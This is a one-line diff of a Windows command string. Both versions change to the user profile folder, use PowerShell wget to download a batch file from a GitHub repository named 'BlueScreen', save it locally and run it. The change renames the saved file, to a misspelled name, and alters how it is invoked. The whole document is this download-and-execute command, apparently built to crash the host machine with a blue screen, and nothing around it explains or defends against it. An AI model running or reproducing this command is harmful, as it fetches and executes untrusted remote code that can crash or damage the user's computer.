@@ -1,1 +1,1 @@
-cmd /c @echo off & cd %userprofile% & powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/online_temp.bat -outfile online_bluescreen.bat && "%userprofile%\online_bluescreen.bat"
+cmd /c @echo off & cd %userprofile% & powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/online_temp.bat -outfile bluescren_temp.bat && bluescren_temp.bat
